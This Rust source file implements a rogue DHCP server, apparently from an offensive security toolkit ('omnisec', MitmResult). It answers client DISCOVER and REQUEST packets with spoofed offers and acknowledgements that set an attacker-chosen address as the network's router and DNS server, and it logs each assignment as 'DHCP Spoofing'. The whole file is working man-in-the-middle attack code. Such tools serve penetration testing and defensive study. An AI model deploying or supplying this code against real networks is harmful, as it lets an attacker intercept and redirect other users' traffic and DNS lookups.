use std::net::{Ipv4Addr, UdpSocket};
use std::str::FromStr;

/// Runs a Rogue DHCP server on `listen_addr` (usually 0.0.0.0:67).
/// It hands out IP addresses and sets `gateway_ip` as the router and DNS server.
///
/// Blocking std version: one thread serves the socket loop.
pub fn run_rogue_dhcp_server(listen_addr: &str, gateway_ip: &str) -> crate::MitmResult<()> {
    omnisec_log::info!(
        "DHCP Rogue Server starting on {} (Gateway: {})",
        listen_addr,
        gateway_ip
    );

    let gw_addr = Ipv4Addr::from_str(gateway_ip).map_err(|e| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("invalid DHCP gateway IPv4 address {gateway_ip:?}: {e}"),
        )
    })?;
    let socket = UdpSocket::bind(listen_addr)?;
    socket.set_broadcast(true)?;

    // A very simple static IP pool for demonstration
    let mut next_ip: u32 = u32::from_be_bytes(gw_addr.octets()) + 100;

    let mut buf = [0u8; 1500];
    loop {
        let (len, _src_addr) = match socket.recv_from(&mut buf) {
            Ok(res) => res,
            Err(e) => {
                omnisec_log::warn!("Failed to read from DHCP socket: {}", e);
                continue;
            }
        };

        if len < 240 {
            continue; // Too small for DHCP
        }

        let packet = &buf[..len];
        if packet[0] != 1 {
            continue; // Not a BOOTREQUEST (1)
        }

        let xid = &packet[4..8];
        let chaddr = &packet[28..44]; // Client MAC address

        // Very basic parsing to find message type
        let mut msg_type = 0;
        let mut offset = 240; // Options start

        // Magic cookie check
        if packet.len() >= 240 && packet[236..240] == [99, 130, 83, 99] {
            while offset < packet.len() {
                let opt = packet[offset];
                if opt == 255 {
                    break; // End
                }
                if opt == 0 {
                    offset += 1; // Pad
                    continue;
                }
                offset += 1;
                if offset >= packet.len() {
                    break;
                }
                let opt_len = packet[offset] as usize;
                offset += 1;

                if opt == 53 && opt_len == 1 && offset < packet.len() {
                    msg_type = packet[offset];
                }
                offset += opt_len;
            }
        }

        // 1 = DISCOVER, 3 = REQUEST
        if msg_type == 1 || msg_type == 3 {
            let reply_type = if msg_type == 1 { 2 } else { 5 }; // 2 = OFFER, 5 = ACK

            let mut response = vec![0u8; 240];
            response[0] = 2; // BOOTREPLY
            response[1] = packet[1]; // Hardware type
            response[2] = packet[2]; // Hardware address len
            response[3] = 0; // Hops
            response[4..8].copy_from_slice(xid); // XID

            // Assign IP
            let assigned_ip = Ipv4Addr::from(next_ip);
            if msg_type == 1 {
                next_ip += 1;
            }

            response[16..20].copy_from_slice(&assigned_ip.octets()); // YIADDR (Your IP)
            response[28..44].copy_from_slice(chaddr); // CHADDR

            // Magic cookie
            response.extend_from_slice(&[99, 130, 83, 99]);

            // DHCP Message Type
            response.extend_from_slice(&[53, 1, reply_type]);
            // Subnet Mask (255.255.255.0)
            response.extend_from_slice(&[1, 4, 255, 255, 255, 0]);
            // Router
            response.extend_from_slice(&[3, 4]);
            response.extend_from_slice(&gw_addr.octets());
            // DNS Server
            response.extend_from_slice(&[6, 4]);
            response.extend_from_slice(&gw_addr.octets());
            // IP Lease Time (1 hour)
            response.extend_from_slice(&[51, 4, 0, 0, 14, 16]);
            // Server Identifier
            response.extend_from_slice(&[54, 4]);
            response.extend_from_slice(&gw_addr.octets());
            // End
            response.push(255);

            omnisec_log::info!(
                "DHCP Spoofing: Assigned {} to MAC {:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                assigned_ip,
                chaddr[0],
                chaddr[1],
                chaddr[2],
                chaddr[3],
                chaddr[4],
                chaddr[5]
            );

            let _ = socket.send_to(&response, "255.255.255.255:68");
        }
    }
}
